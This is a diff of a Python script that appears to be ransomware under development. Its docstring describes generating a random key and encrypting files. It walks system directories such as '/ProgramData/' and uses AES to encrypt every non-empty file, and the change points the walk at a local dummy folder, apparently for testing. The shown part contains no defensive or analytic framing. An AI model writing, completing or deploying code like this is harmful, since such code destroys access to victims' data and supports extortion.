@@ -12,7 +12,7 @@
    * Generate random key
    * encrypt file
 '''
-import os
+from os import walk
 from os.path import join, getsize
 from Crypto.Cipher import AES
 from Crypto.Random import get_random_bytes
@@ -37,8 +37,11 @@ paths = (
 	'/ProgramData/'
 	)
 
+paths = (
+	'/Users/bulletfarmer/Desktop/dummy/'
+)
 
-for root, dirs, files in chain.from_iterable(os.walk(path) for path in paths):
+for root, dirs, files in chain.from_iterable(walk(path) for path in paths):
 	for file_name in files:
 		filename = join(root, file_name)
 		if getsize(filename) > 0:
